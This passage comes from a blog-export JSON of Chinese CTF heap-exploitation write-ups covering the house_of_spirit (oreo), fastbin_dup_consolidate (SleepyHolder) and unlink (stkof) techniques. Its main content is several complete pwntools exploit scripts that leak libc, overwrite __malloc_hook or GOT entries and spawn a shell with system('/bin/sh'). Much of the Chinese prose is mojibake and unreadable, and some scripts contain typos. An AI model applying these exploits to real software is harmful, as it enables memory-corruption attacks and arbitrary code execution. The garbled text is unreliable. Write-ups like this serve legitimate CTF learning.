0x100çš„å†…å­˜ï¼Œç”¨æ¥å¡«å……chunk_bï¼Œå¹¶ç”¨malloc_hookçš„ä¸Šæ–¹åœ°å€è¦†å†™chunk_cçš„fdã€‚ â€‹ 4.mallocä¸¤æ¬¡ï¼Œä»¥malloc_hookä¸Šæ–¹åœ°å€ä¸ºé¦–åœ°å€çš„chunkï¼Œå†™å…¥one_gadgetåˆ°malloc_hookï¼Œå®Œäº‹å„¿ã€‚ã€‚ D . Exploitâ€‹ è„šæœ¬è¿˜æ˜¯å¾—å‚è€ƒCTF-Wikiï¼Œè‡ªå·±çœŸæ˜¯è‚ä¸å‡ºæ¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#! /usr/bin/env python2# -*- coding: utf-8 -*-# vim:fenc=utf-8import sysimport osimport os.pathfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)if len(sys.argv) &gt; 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT)else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ubuntu 16.04def cmd(command_num): p.recvuntil(&#x27;command:&#x27;) p.sendline(str(command_num))def put(key, size, data): cmd(&#x27;PUT&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;data:&#x27;) if len(data) &lt; size: p.send(data.ljust(size, &#x27;\\x00&#x27;)) else: p.send(data)def delete(key): cmd(&#x27;DEL&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key)def get(key): cmd(&#x27;GET&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;[&#x27;) num = int(p.recvuntil(&#x27; bytes&#x27;).strip(&#x27; bytes&#x27;)) p.recvuntil(&#x27;:\\n&#x27;) return p.recv(num)def main(): # avoid complicity of structure malloc for i in range(10): put(str(i), 0x38, str(i)) for i in range(10): delete(str(i)) # allocate what we want in order put(&#x27;1&#x27;, 0x200, &#x27;1&#x27;) put(&#x27;2&#x27;, 0x50, &#x27;2&#x27;) put(&#x27;5&#x27;, 0x68, &#x27;6&#x27;) put(&#x27;3&#x27;, 0x1f8, &#x27;3&#x27;) put(&#x27;4&#x27;, 0xf0, &#x27;4&#x27;) put(&#x27;defense&#x27;, 0x400, &#x27;defense-data&#x27;) # free those need to be freed delete(&#x27;5&#x27;) delete(&#x27;3&#x27;) delete(&#x27;1&#x27;) delete(&#x27;a&#x27; * 0x1f0 + p64(0x4e0)) delete(&#x27;4&#x27;) put(&#x27;0x200&#x27;, 0x200, &#x27;fillup&#x27;) put(&#x27;0x200 fillup&#x27;, 0x200, &#x27;fillup again&#x27;) libc_leak = u64(get(&#x27;2&#x27;)[:6].ljust(8, &#x27;\\x00&#x27;)) p.info(&#x27;libc leak: 0x%x&#x27; % libc_leak) libc_base = libc_leak - 0x3c4b78 p.info(&#x27;libc_base: 0x%x&#x27; % libc_base) put(&#x27;fastatk&#x27;, 0x100, &#x27;a&#x27; * 0x58 + p64(0x71) + p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x10 + 5 - 8)) put(&#x27;prepare&#x27;, 0x68, &#x27;prepare data&#x27;) one_gadget = libc_base + 0x4526a put(&#x27;attack&#x27;, 0x68, &#x27;a&#x27; * 3 + p64(one_gadget)) p.sendline(&#x27;DEL&#x27;) # malloc(8) triggers one_gadget p.interactive()if __name__ == &#x27;__main__&#x27;: main() â€‹ ps.ä¸è¿‡æœ‰ä¸€ä¸ªåœ°æ–¹ä¸€ç›´æ²¡å¼„æ˜ç™½ï¼šå‰é¢è¯´çš„æ¯ä¸€æ¬¡PUTéƒ½ä¼šmallc()3æ¬¡ï¼Œè€Œä¸”ç†åº”æ˜¯è¿ç»­åœ°å€çš„ä¸‰ä¸ªchunkï¼Œä½†æ˜¯CTF-Wikiçš„è§£æ³•ï¼Œä»¥åŠå„ç§å…¶ä»–å¸ˆå‚…çš„è§£æ³•éƒ½åªè€ƒè™‘äº†data chunkï¼Œæˆ‘å’Œåˆ˜è€æ¿å€’æ˜¯è€ƒè™‘äº†ä¸‰ä¸ªchunkè¿ç»­çš„æƒ…å†µï¼Œä½†æ˜¯æˆ‘æ²¡æ•´å‡ºæ¥ã€‚æš‚æ—¶å…ˆæŒ‰ç…§writeupçš„æ¥å§ã€‚ã€‚ä¹‹åå†å›å¤´çœ‹çœ‹ã€‚","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"House_of_spirit","slug":"house-of-spirit","date":"2020-03-06T10:43:46.000Z","updated":"2021-03-24T09:46:32.419Z","comments":true,"path":"2020/03/06/house-of-spirit/","link":"","permalink":"http://example.com/2020/03/06/house-of-spirit/","excerpt":"â€‹ Fastbin Attack ä¸­çš„ house_of_spiritã€‚ (ç²¾ç¥å®¶å›­ï¼Ÿï¼Ÿ)","text":"â€‹ Fastbin Attack ä¸­çš„ house_of_spiritã€‚ (ç²¾ç¥å®¶å›­ï¼Ÿï¼Ÿ) 0x00 . house_of_spiritâ€‹ æŒ‰ç…§æƒ¯ä¾‹ã€‚ã€‚ã€‚çœ‹çœ‹how2heapçš„ä»£ç ï¼š 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\\n&quot;, malloc(0x30));&#125; â€‹ è¯´å®è¯ï¼Œè¿™ä¸ªä»£ç çœ‹å¾—è„‘å£³ç–¼ï¼Œæ²¡å®Œå…¨çœ‹æ‡‚ã€‚ â€‹ å¤§æ¦‚çš„æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œæ‰¾ä¸€ä¸ªå¯æ§çš„åŒºåŸŸï¼Œæ¯”å¦‚æ ˆï¼Œbssæ®µï¼Œå¯è¯»å¯å†™çš„ï¼Œåœ¨æ­¤åŒºåŸŸå†™ä¸€ä¸ªfake fast chunkï¼Œç„¶åæƒ³åŠæ³•freeæ‰ï¼Œè¿™ä¹ˆä¸€æ¥å°±æ‰è¿›äº†fastbiné‡Œé¢ã€‚å› ä¸ºfake fast chunkåœ¨é“¾è¡¨å¤´(main_arenaæŒ‡å‘)ï¼Œæ‰€ä»¥mallocåfake chunkä¼šç›´æ¥åˆ†é…å‡ºæ¥ï¼Œç„¶åå°±å¯ä»¥ä»»æ„è¯»å†™éšæ„æµªäº†ã€‚ 0x01 . oreo ğŸªA . ELF Analysisâ€‹ æ˜æ˜æ˜¯ä¸ªä¹°æªçš„ç¨‹åºã€‚ã€‚ã€‚ä¸ºå•¥å«å¥¥åˆ©å¥¥ â€‹ èŠ±é‡Œèƒ¡å“¨çš„æœ€å–œæ¬¢äº†ğŸ˜¬ğŸ˜¬ğŸ˜¬ â€‹ ä¸»è¦å‡½æ•°å¦‚ä¸‹ â€‹ addå‡½æ•°é‡Œå¯ä»¥å‘ç°ï¼Œç¨‹åºæ·»åŠ chunkæ—¶ï¼Œä¼šå½¢æˆè¿™æ ·çš„ä¸€ç§é“¾è¡¨ç»“æ„ï¼š â€‹ å¹¶ä¸”å­˜åœ¨æ˜æ˜¾çš„æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥ä¼°æ‘¸ç€è¦†ç›–æ‰nextæŒ‡é’ˆã€‚ â€‹ show()ï¼šå±•ç¤ºæ‰€æœ‰è®¢å•çš„descriptionå’Œnameã€‚ â€‹ order()ï¼šä¸‹å•ï¼Œå¹¶åˆ é™¤å‰é¢æ‰€æœ‰chunkã€‚ â€‹ leave()ï¼šåœ¨è®¢å•ä¸­å¤‡æ³¨ï¼Œç”¨åˆ°äº†messageæŒ‡é’ˆ(bssæ®µ)ï¼Œè€ŒmessageæŒ‡é’ˆåœ¨ç¨‹åºå¼€å¤´å°±æŒ‡å‘äº†message_ptrã€‚ â€‹ stats()ï¼šè¾“å‡ºè®¢å•æ•°å’Œå¤‡æ³¨æ•°ä»¥åŠæœ€è¿‘ä¸€æ¬¡å¤‡æ³¨å†…å®¹ï¼Œå¯ä»¥ç”¨ä½œè¾“å‡ºã€‚ â€‹ ç¨‹åºä¸­ç”¨åˆ°çš„è®¸å¤šé‡è¦æŒ‡é’ˆéƒ½èƒ½åœ¨bssæ®µæ‰¾åˆ°ï¼š B . Main ideas ğŸ’¡ å †æº¢å‡ºæ„é€ é“¾è¡¨ï¼ŒLeak libc_baseã€‚ ä¼ªé€ fake chunkï¼Œå¹¶ä¸”ç»•è¿‡æ£€æµ‹ Getshell C . Step by Step1.Leak libc_base æ–°å»ºä¸€ä¸ªchunkï¼Œé€šè¿‡æº¢å‡ºä½¿å¾—å…¶nextæŒ‡é’ˆæŒ‡å‘puts@got show()æŸ¥çœ‹æ‰€æœ‰chunkçš„å†…å®¹ï¼Œå¾—åˆ°puts_addr é€šè¿‡è®¡ç®—å¾—åˆ°libc_baseï¼Œsystem@gotã€‚ 2.Arrange fake chunk å¾ªç¯æ–°å»ºchunkï¼Œå½“count_in_add == 0x3fï¼Œé€€å‡ºå¾ªç¯ã€‚ æ­¤æ—¶å†æ–°å»ºä¸€ä¸ªchunkæ„é€ fake chunkã€‚æ­¤æ—¶count_in_add == 0x40ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç”¨ä½œfake chunk size fake chunkç»“æ„å¦‚ä¸‹ï¼š æŠŠfake chunkçš„next chunkçš„pre_sizeä¹Ÿç»™æ”¹äº†ï¼Œå°±èƒ½ç»•è¿‡æµ‹è¯•äº†ã€‚ ä¸‡äº‹ä¿±å¤‡ï¼Œç”¨order()æ¥freeæ‰æ•´ä¸ªé“¾è¡¨ï¼Œç„¶åmain_arenaå°±æŒ‡å‘äº†æœ€åçš„fake chunkã€‚ 3.Getshell ç°åœ¨æˆ‘ä»¬add()å°±èƒ½å¾—åˆ°fake chunkï¼Œå†åœ¨é‡Œé¢å†™å…¥fgets@gotï¼Œä¹Ÿå°±æ˜¯å†™å…¥åˆ°äº†fake chunkçš„fdä½ç½®ã€‚fgets@gotåœ¨èœå•å¾ªç¯çš„switchçš„å‚æ•°å‡½æ•°ä¸­ä¼šç”¨åˆ°ã€‚è€Œçº¢è‰²ç®­å¤´ä½ç½®å°±æ˜¯æˆ‘ä»¬è¦å†™å…¥â€œ/bin/shâ€çš„åœ°å„¿ã€‚ è¿™æ—¶å†ç”¨leave()å‡½æ•°ï¼Œä¿®æ”¹messageã€‚æ³¨æ„æ­¤æ—¶messageä¸fake chunkçš„fdæ˜¯åŒä¸€åœ°å€ï¼Œä¸Šé¢çš„fake chunkç»“æ„å›¾æ¯”è¾ƒæ¸…æ¥šã€‚å°†messageä¸­å†…å®¹(fgets@got)æ”¹æˆsystem@gotã€‚ ç°åœ¨ç›´æ¥é€å…¥â€/bin/sh\\x00â€å°±è¡Œå•¦ã€‚ D . Exploit1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *p = process(&#x27;./oreo&#x27;)elf = ELF(&#x27;./oreo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def add(des,name): p.sendlineafter(&quot;Action: &quot;,str(1)) p.sendlineafter(&quot;Rifle name: &quot;,name) p.sendlineafter(&quot;Rifle description: &quot;,des)def show(): p.sendlineafter(&quot;Action: &quot;,str(2)) p.recvuntil(&quot;===================================&quot;)def order(): p.sendlineafter(&quot;Action: &quot;,str(3)) p.recvuntill(&quot;Okay order submitted!&quot;)def leave(message): p.sendlineafter(&quot;Action: &quot;,str(4)) p.sendlineafter(&quot;your order:&quot;,message)def stats(): p.sendlineafter(&quot;Action: &quot;,str(5))puts_got = elf.gots[puts]free_got = elf.gots[free]puts_offset = libc.symbols[puts]system_offset = libc.symbols[system]#========================Leak libc base============================payload = 27 * &#x27;X&#x27; + p32(puts_got) #so the next chunk we could recv puts_gotadd(&quot;Nothing&quot;,payload)show()p.recvuntil(&quot;===================================&quot;)p.recvuntil(&quot;Description: &quot;)puts_plt = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4]) #got the ture addr of putslibc_base = puts_plt - puts_offsetsystem_addr = libc_base + system_offset#========================Arrange fake chunk==========================num = 1while num&lt;3f : #System will break the circle while num (count_in_add) == 3f add(str(num),&quot;gun&quot;+str(num)) num++payload = 27 * &#x27;X&#x27; + p32(0x0804A2A8) #But 0x0804A2A8(massage) is now saving the message_ptradd(&quot;Nothing&quot;,payload) #count_in_add == 0x40,so it can be used as the size of fake_chunkpayload = 0x20 * &#x27;X&#x27; + p32(0x40)leave(payload) #now the fake_chunk is in the link_list and able to bypass the testorder() #delete the linklist,so the fake_chunk is in the fastbin now#============================Getshell=============================fgets_got = elf.got[fgets]add(fgets_got,&quot;Nothing&quot;) #the fake_chunk was malloced since it is in the bin_topleave(system_addr) #fgets_got was changed to system_addrp.sendline(&quot;/bin/sh\\x00&quot;) #fgets(&quot;/bin/sh&quot;) &lt;====&gt; system(&quot;/bin/sh&quot;)p.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"SleepHolder","slug":"SleepHolder","date":"2020-03-03T05:43:46.000Z","updated":"2021-03-24T09:47:13.425Z","comments":true,"path":"2020/03/03/SleepHolder/","link":"","permalink":"http://example.com/2020/03/03/SleepHolder/","excerpt":"â€‹ å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚","text":"â€‹ å…³äºfastbin_dup_consolidateï¼Œä»¥åŠunlinkçš„å¦ä¸€é¢˜ã€‚ â€‹ ä»Šå¤©åšé¢˜è¿˜æŒºå¿«ï¼Œæ¯•ç«Ÿæ˜¯ä¹‹å‰å·²ç»ç ”ç©¶è¿‡ä¸€ç‚¹çš„é¢˜ç›®ã€‚ 0x00 . fastbin_dup_consolidateâ€‹ è´´ä¸€ä¸‹ä»£ç ä½œä¸ºä¾‹å­ã€‚ã€‚(code from how2heap) 1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;stdlib.h&gt;int main() &#123; void p1 = malloc(0x40); void p2 = malloc(0x40); fprintf(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2); fprintf(stderr, Now free p1!n); free(p1); void p3 = malloc(0x400); fprintf(stderr, Allocated large bin to trigger malloc_consolidate() p3=%pn, p3); fprintf(stderr, In malloc_consolidate(), p1 is moved to the unsorted bin.n); free(p1); fprintf(stderr, Trigger the double free vulnerability!n); fprintf(stderr, We can pass the check in malloc() since p1 is not fast top.n); fprintf(stderr, Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice %p %pn, malloc(0x40), malloc(0x40));&#125; â€‹ ä»£ç è¯´æ˜äº†ä¸¤ä»¶äº‹ï¼š â€‹ 1ã€è¦å®ç°doubleå¹¶éåªèƒ½ç”¨é‡Šæ”¾å †å—æ¥æ©æŠ¤ï¼šfree(1);free(2);free(1);è¿˜å¯ä»¥ç”³è¯·å †å—æ¥æ©æŠ¤ï¼šfree(1);malloc(2);free(1); â€‹ 2ã€ç³»ç»Ÿåœ¨åˆ†é…large chunkçš„æ—¶å€™ä¼šè°ƒç”¨malloc_consolidate()ï¼Œè¿™ä¸ªå‡½æ•°ç›¸å½“äºfree()ï¼Œå°±æ˜¯ä¸€ä¸ªå›æ”¶å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†fastbinä¸­çš„chunkæ•´ç†ä¸€ä¸‹ï¼Œèƒ½åˆå¹¶å°±åˆå¹¶ï¼Œä¸èƒ½åˆå¹¶ä¹Ÿæ¸…é™¤ä¸€ä¸‹ä½¿ç”¨æ ‡å¿—ä½(inuse = 0)ï¼Œç„¶åå…¨éƒ¨ä¸¢åˆ°unsort biné‡Œé¢ã€‚ â€‹ 3ã€æ‰€ä»¥å¦‚æœå†malloc()ä¸€æ¬¡ï¼Œå°±å¯ä»¥å¤šfree(1)ä¸€æ¬¡ï¼Œå› ä¸ºäººå®¶æœ¬æ¥ä¹Ÿä¸åœ¨fast binï¼Œè€Œä¸”ä¹Ÿä¸è¢«top chunkæ‰€æŒ‡ã€‚ 0x01 . SleepyHolder Write UpA . åˆ†æç¨‹åºâ€‹ è¿è¡Œçœ‹çœ‹æ•ˆæœï¼š 1234567891011121314151617181920212223242526272829303132Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1. Keep secret2. Wipe secret3. Renew secret1What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever1Tell me your secret: AAAAAA1. Keep secret2. Wipe secret3. Renew secret3Which Secret do you want to renew?1. Small secret2. Big secret1Tell me your secret: Small1. Keep secret2. Wipe secret3. Renew secret2Which Secret do you want to wipe?1. Small secret2. Big secret1 â€‹ çœ‹çœ‹ä¿æŠ¤å’Œæ–‡ä»¶æ ¼å¼ï¼š â€‹ ä¸»è¦å‡½æ•°å¦‚ä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–æœ¬ç¨‹åºä¸­çš„alarm()ä¹Ÿéœ€è¦keypatchæ‰ã€‚ â€‹ åˆ†æä¸»è¦å‡½æ•°ï¼š â€‹ Add():åªå…è®¸åˆ†é…small,big,hugeä¸‰ç§secretï¼Œæ¯ç§åªèƒ½åˆ†é…ä¸€æ¬¡ï¼Œè€Œä¸”hugeåªè¦åˆ†é…è¿‡åï¼Œå°±ä¸å†å…è®¸ä½¿ç”¨huge secretäº†ã€‚å¦å¤–ï¼Œè¿™ä¸‰ç§secretçš„æŒ‡é’ˆéƒ½ä½äºbssæ®µï¼Œæ˜¯å…¨å±€å˜é‡ã€‚ â€‹ Wipe():free()æ—¶æœªæ£€æŸ¥æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå­˜åœ¨Double freeæ¼æ´ã€‚ â€‹ Renew():è¾“å…¥é™åˆ¶å¤§å°ï¼Œä¸å¯å †æº¢å‡ºã€‚å› æ­¤æ„é€ å’Œè¾“å…¥payloadæ—¶éƒ½è¦æ ¹æ®secretå¤§å°æ¥é€‰æ‹©ã€‚ â€‹ å¦å¤–ç¨‹åºä¸­æ²¡æœ‰æ‰¾åˆ°è¾“å‡ºå‡½æ•°ï¼Œå¤§è‡´æ–¹å‘è¿˜æ˜¯ä¿®æ”¹gotè¡¨ï¼Œputs(func@plt)ï¼Œè®¡ç®—åç§»å¾—åˆ°libcï¼Œå†getshellã€‚ B . å†…å­˜å¸ƒå±€ ç”³è¯·small chunkå’Œbig chunkï¼Œç„¶åé‡Šæ”¾small chunkã€‚ ç”³è¯·huge chunkï¼Œæ­¤æ—¶ç”±äºmalloc_consolidate()ï¼Œsmall chunkè¢«ä¸¢è¿›unsort binã€‚ å†é‡Šæ”¾small chunkï¼ŒåˆæŠŠsmall chunkä¸¢è¿›fast binã€‚double freeã€‚ small chunkæ„é€ fake_chunkï¼Œå¹¶ä¿®æ”¹big chunkçš„æ ‡å¿—ä½ï¼Œæ¬ºéª—ç³»ç»Ÿç›¸ä¿¡fake chunkå·²ç»freeï¼Œéœ€è¦åˆå¹¶ã€‚ æ­¤æ—¶é‡Šæ”¾big chunkï¼Œç³»ç»Ÿä¼šä½¿å…¶ä¸small_chunké‡Œé¢çš„fake_chunkåˆå¹¶ï¼Œå¯¼è‡´unlinkã€‚ æ­¤æ—¶å†™å…¥fake chunkä¸­çš„æŒ‡é’ˆæˆåŠŸåç§»ã€‚ C . Leak &amp; Getshell é€šè¿‡small_ptræŠŠbig_ptrã€small_ptrå’Œ3ä¸ªæ ‡å¿—ä½åˆ†åˆ«æ”¹æˆatoi@pltï¼Œfree@gotï¼Œå’Œ1ã€‚ renew(1)å°†puts@gotå†™å…¥small_ptrï¼Œå…¶å®æ˜¯è¦†å†™äº†free@gotã€‚ free(2)ç›¸å½“äºputs(atoi@plt)ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥é€å‡ºlibcåœ°å€å•¦ã€‚ ç°åœ¨æˆ‘ä»¬å·²ç»æˆåŠŸé€åˆ°äº†libcçš„åœ°å€ï¼Œé€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°systemåœ°å€äº†ã€‚ renew(1)å°†system_addrå†™å…¥åˆ°small_ptrï¼Œå…¶å®ä¹Ÿæ˜¯è¦†å†™äº†free@gotã€‚ renew(2)å°†â€/bin/sh\\x00â€å†™å…¥åˆ°big_ptrå¾…ç”¨ã€‚ ç°åœ¨åªè¦wipe(2)ï¼Œå®é™…ä¸Šå°±æ˜¯getshellå’¯(ã€‚ãƒ»âˆ€ãƒ»)ãƒã€‚ D . Exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *p = process(&#x27;./SleepyHolder&#x27;)elf = ELF(&#x27;./SleepyHolder&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)small_ptr = 0x06020D0free_addr = elf.got[free]puts_addr = elf.got[puts]puts_plt = elf.plt[puts]atoi_addr = elf.got[atoi]atoi_offset = libc.symbols[atoi]system_offset = libc.symbols[system]def add(index,content): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(1)) p.recvuntil(&quot;\\n&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:\\n&quot;) p.send(content)def wipe(index): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(2)) p.recvuntill(&quot;2. Big secret\\n&quot;) p.send(str(index))def renew(index,content): p.recvuntill(&quot;3. Renew secret&quot;) p.send(str(3)) p.recvuntill(&quot;2. Big secret&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:&quot;) p.send(content)#=======================Memory Arrange=======================add(1,&quot;AAAAAAAA&quot;)add(2,&quot;BBBBBBBB&quot;)wipe(1)add(3,&quot;CCCCCCCCC&quot;) #triger malloc_consolidate()wipe(1) #double freefake_chunk =p64(0)*2 #chunk header is uselessfake_chunk+=p64(small_ptr-0x18) #unlink ptrfake_chunk+=p64(small_ptr-0x10) #unlink ptr toofake_chunk+=p64(0x20) #made chunk2 believe that chunk1is free to triger unlinkadd(1,fake_chunk) #now we can move the small_ptr laterwipe(2) #triger the unlink#============================ Leak ===========================payload = &#x27;A&#x27;*8payload+=atoi_addr #big_chunk = atoi@gotpayload+=&#x27;A&#x27;*8 #the huge_ptr is useless anywaypayload+=free_addr #small_chunk = free@gotpayload+=p64(1)*3 #insure 3 flags == 1renew(1,payload) #change the chunk_ptr to gotrenew(1,puts_plt) #change free_addr to puts_pltwipe(2) #free(big_ptr) &lt;----&gt; puts(puts_plt)#=========================== GetShell ========================libc_base = u64(p.recvn(6).ljust(8,&#x27;/x00&#x27;)) - atoi_offsetsystem_addr = libc_base + system_offsetrenew(1,p64(system_addr))renew(2,&quot;/bin/sh\\x00&quot;)free(2)p.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Unlink(stkof)","slug":"Unlink-stkof","date":"2020-03-02T12:57:20.000Z","updated":"2021-03-24T09:49:16.965Z","comments":true,"path":"2020/03/02/Unlink-stkof/","link":"","permalink":"http://example.com/2020/03/02/Unlink-stkof/","excerpt":"â€‹ å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚","text":"â€‹ å…³äºunlinkçš„ä»‹ç»å’Œå…¥é—¨ã€‚ã€‚ã€‚ã€‚ â€‹ unlinkä¹Ÿæ˜¯ä¸€ä¸ªçœ‹äº†å¥½ä¹…çœ‹ä¸æ‡‚çš„ä¸œè¥¿ï¼Œä»Šå¤©ç®—æ˜¯æ•´æ˜ç™½äº†ã€‚ 0x00 . unlink æ¼æ´A . unlinkåŸç†â€‹ å‡è®¾æœ‰å¦‚ä¸‹chunk0ï¼Œchunk1ï¼Œå…¶ä¸­chunk0æ˜¯ä½¿ç”¨ä¸­çš„smallï¼Œchunk1æ˜¯å·²é‡Šæ”¾çš„small chunkï¼Œä¸¤è€…åœ¨å†…å­˜ä¸Šç›¸é‚»ã€‚ â€‹ ç”±äºchunk1å·²é‡Šæ”¾ï¼Œæ‰€ä»¥ä½äºsmall biné“¾è¡¨ä¸­ï¼Œåˆä¸chunk2ï¼Œchunk3åœ¨é“¾è¡¨ç»“æ„ä¸Šç›¸é‚»ã€‚ â€‹ æ­¤æ—¶å¦‚æœfree(chunk0)ï¼Œglibcæœºåˆ¶å°±ä¼šåˆ¤æ–­å‰å(å†…å­˜ä¸Š)æœ‰æ— ç›¸é‚»çš„å·²é‡Šæ”¾chunkï¼Œå¦‚æœæœ‰ï¼Œå°±å’Œchunk0ä¸€åŒåˆå¹¶æˆä¸€ä¸ªå¤§chunkã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œè¿˜è¦æŠŠchunk1ä»small binä¸­â€œæ‹”å‡ºæ¥â€ï¼Œå…¶ä¸­å‘ç”Ÿçš„æ–­é“¾ï¼Œä¿®æ”¹é“¾è¡¨çš„æ“ä½œå°±æ˜¯unlinkã€‚æ¢è¨€ä¹‹unlinkå°±æ˜¯ä¸€ä¸ªä»åŒå‘é“¾è¡¨ä¸­æŠ½å‡ºä¸€ä¸ªchunkçš„æ“ä½œã€‚ï¼ˆphoto from ctf-wikiï¼‰ â€‹ â€‹ æ‰€ä»¥unlinkåªé€‚ç”¨äºéfast chunkï¼Œå› ä¸ºfast chunkä¸å­˜åœ¨åŒå‘é“¾è¡¨ï¼ŒåŒæ—¶fast chunkä¹Ÿå¹¶ä¸æ˜¯ç”¨å®Œå°±é©¬ä¸Šå›æ”¶çš„ã€‚ B . å†å²çš„æ¼æ´åˆ©ç”¨ï¼ˆ32 bitï¼‰â€‹ é‚£ä¹ˆå¦‚ä½•é€šè¿‡unlinkè¾¾åˆ°ä»»æ„å†™çš„ç›®çš„å‘¢ï¼Ÿæ›¾ç»çš„unlinkåˆ©ç”¨æ˜¯è¿™æ ·çš„ï¼š â€‹ â€‹ 1.åœ¨è¿›è¡Œunlinkä¹‹å‰ä¿®æ”¹chunk0çš„fdå’Œbkï¼Œä½¿å¾—FD = target_addrï¼ŒBK = expect valueï¼ˆå¯ä»¥é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ¼æ´ä¿®æ”¹ï¼Œæˆ–è€…æ„é€ fake chunkï¼‰ã€‚ â€‹ 2.è¿›è¡Œåˆå¹¶æ“ä½œï¼Œéœ€è¦å°†chunk1çš„å‰é©±åç»§çš„æŒ‡å‘ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆchunk0çš„å‰é©±åç»§ï¼Œä¹Ÿå°±æ˜¯å°†chunk1çš„FDå’ŒBKæ”¹æˆchunk0çš„FDå’ŒBKï¼Œåœ¨ä¸€èµ·æ€»è¦ä¸€æ¡å¿ƒå˜›ã€‚ â€‹ 3.æ­¤æ—¶chunk1å·²ç»FDå†™å…¥äº†target_addrï¼ŒBKå†™å…¥äº†expect valueï¼Œåœ¨é‡Šæ”¾chunk0ï¼Œä½¿å¾—chunk1è¿›è¡Œunlinkã€‚ â€‹ 4.chunk1çš„unlinkï¼Œå®é™…ä¸Šå°±æ˜¯ä¿®æ”¹small 